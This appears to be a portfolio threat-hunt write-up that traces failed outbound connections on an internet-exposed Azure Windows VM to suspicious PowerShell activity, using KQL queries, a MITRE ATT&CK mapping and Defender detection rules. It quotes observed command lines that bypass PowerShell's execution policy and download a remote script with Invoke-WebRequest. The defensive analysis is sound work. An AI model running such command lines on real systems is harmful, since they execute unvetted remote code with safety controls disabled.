<div align="center">

# Threat Hunt: Sudden Network Slowdowns
## PowerShell LOLBin Investigation on Internet-Exposed Windows VM

**Type:** Threat Hunt → Incident Response  
**Environment:** LOG(N) Pacific Cyber Range — Azure Windows VM  
**Tools:** `KQL` `Microsoft Defender for Endpoint` `Log Analytics Workspaces` `Microsoft Azure`

[← Back to Threat Hunting Overview](../README.md)

</div>

---

## Background

A Windows virtual machine exposed to the internet began exhibiting unusual network behavior — users reported slowdowns and the host was generating a high volume of failed outbound connection attempts. The question on the table: is this malicious activity, or normal system-generated noise like Windows Update traffic?

This hunt started with network telemetry and ended with suspicious PowerShell execution chains that matched known attacker tradecraft.

---

## Hypothesis

> If a Windows virtual machine is exposed to the internet, external threat actors may attempt unauthorized access or reconnaissance — manifesting as repeated failed authentication attempts or anomalous outbound network connections. By analyzing failed logon events and outbound connection failures, we can determine whether activity represents malicious behavior (brute force, scanning, C2) versus normal system traffic (Windows Update, telemetry).

---

## Investigation

### Step 1 — Identify Failed Connection Volume

Started with a broad look at failed outbound connections across all devices to establish a baseline and identify which hosts were most active.

```kql
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| summarize connection_count = count() by DeviceName, ActionType, LocalIP, RemoteIP
| order by connection_count desc
```

**Finding:** The target Windows VM had 182 failed connection attempts to a single remote IP — the highest volume in the environment. A second host showed 161. Most traffic was on **TCP 80 and 443**.

**Initial assessment:** The port profile (80/443) didn't look like classic port scanning or brute force. No obvious beaconing pattern. But the volume was anomalous enough to investigate further.

---

### Step 2 — Narrow to the Specific Host and Time Window

Pulled all failed connections specific to the suspected host to isolate its behavior from broader environment noise.

```kql
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| where DeviceName == "windows-target-"
| summarize connection_count = count() by DeviceName, ActionType, LocalIP, RemoteIP
| order by connection_count desc
```

Identified a specific timestamp of interest: `2026-02-02T12:47:41Z`. Scoped the next query to a 10-minute window around that event.

---

### Step 3 — Review Process Activity Around the Event

Pivoted from network logs into process telemetry to see what was running on the host at the time of the unusual network activity.

```kql
let VMName = "windows-target-";
let specificTime = datetime(2026-02-02T12:47:41.6332347Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 10m) .. (specificTime + 10m))
| where DeviceName == VMName
| order by Timestamp desc
| project Timestamp, FileName, InitiatingProcessCommandLine
```

**Finding:** 31 process events returned. Among them — suspicious PowerShell and cmd.exe executions with the following command line patterns:

```
powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
powershell.exe -ExecutionPolicy Unrestricted -File script71.ps1
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent[.]com/...
"cmd" /Cpowershell -ExecutionPolicy Unrestricted -File script71.ps1
```

Also observed:
```
cvtres.exe "csc.exe" /noconfig /fullpaths @C:\Windows\SystemTemp\$vmzcxeh\$vmzcxeh.cmdline
SenseIR.exe "OfflineSenseIR" "3932" "eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZGZpbGVzIjpb..."
```

---

## Why This Is Suspicious

**ExecutionPolicy Bypass / Unrestricted**
- Explicitly disables PowerShell's built-in safety controls
- Rare in legitimate admin automation on endpoints
- A common first move when an attacker wants to run unsigned scripts

**cmd.exe → PowerShell chaining**
- Classic Living-off-the-Land (LOLBin) technique
- Seen in malware execution, red team simulations, and staged payload delivery
- Using a trusted system binary to launch another trusted binary avoids detection

**Script-based execution (`portscan.ps1`, `script71.ps1`)**
- Filenames suggest downloaded or staged scripts, not native system tools
- `portscan.ps1` in `C:\programdata\` is a significant red flag
- `Invoke-WebRequest` pulling from GitHub suggests remote payload staging

**`SenseIR.exe` with encoded command string**
- Base64-like blob passed as an argument — consistent with encoded payload execution

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|---|---|---|
| Command and Scripting Interpreter: PowerShell | **T1059.001** | PowerShell used as primary execution mechanism |
| Impair Defenses: Disable or Modify Tools | **T1562.001** | ExecutionPolicy Bypass disables script execution controls |
| Ingress Tool Transfer | **T1105** | `Invoke-WebRequest` pulling scripts from external URL |
| Network Service Discovery | **T1046** | `portscan.ps1` suggests active network scanning |

---

## Outcome & Remediation

**Malware scan result:** No confirmed malware detected.

**Decision:** Given the volume of suspicious indicators, the device was **isolated** and a ticket was submitted to have it **reimaged and rebuilt** from a clean baseline. Better to be cautious than to risk leaving a compromised host in the environment.

### Immediate Containment
- Terminated suspicious PowerShell and cmd.exe processes
- Disabled external exposure (internet-facing access removed)
- Host placed in isolated network segment pending rebuild

### Hardening Applied
- **Strengthened NSG rules** — deny inbound by default, allow only required ports from known IPs
- **Detection rules created** in Microsoft Defender for Endpoint:
  - Alert on `powershell.exe` with `-ExecutionPolicy Bypass` or `-ExecutionPolicy Unrestricted`
  - Alert on `cmd.exe` spawning `powershell.exe`
- **PowerShell Constrained Language Mode** enabled on rebuilt host to restrict what scripts can execute

---

## Key KQL Queries Used

```kql
// 1. Failed connection volume across all devices
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| summarize connection_count = count() by DeviceName, ActionType, LocalIP, RemoteIP
| order by connection_count desc

// 2. Process activity in 10-minute window around suspicious event
let VMName = "windows-target-";
let specificTime = datetime(2026-02-02T12:47:41.6332347Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 10m) .. (specificTime + 10m))
| where DeviceName == VMName
| order by Timestamp desc
| project Timestamp, FileName, InitiatingProcessCommandLine

// 3. Detection rule — PowerShell execution policy bypass
DeviceProcessEvents
| where FileName =~ "powershell.exe"
| where ProcessCommandLine has_any ("ExecutionPolicy Bypass", "ExecutionPolicy Unrestricted")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc

// 4. Detection rule — cmd.exe spawning PowerShell
DeviceProcessEvents
| where FileName =~ "powershell.exe"
| where InitiatingProcessFileName =~ "cmd.exe"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp desc
```

---

## Lessons Learned

**Start with what's anomalous, not what's obviously malicious.** The network data looked almost clean — common ports, no obvious scanning. But volume anomalies are worth following. The real story was in the process logs.

**LOLBin attacks are designed to blend in.** PowerShell and cmd.exe are legitimate tools. The tell is in the flags and the command line structure, not the binary name itself. That's why process command line logging is non-negotiable.

**When in doubt, rebuild.** No malware detected doesn't mean no compromise. The presence of `portscan.ps1`, staged scripts, and external download attempts on an internet-facing host was enough to justify a full rebuild rather than attempting remediation in place.

---

<div align="center">

[← Back to Threat Hunting Overview](../README.md) · [← Back to Portfolio](../../README.md)

*Michael Edwards · Houston, TX · [maedwards880@gmail.com](mailto:maedwards880@gmail.com)*

</div>
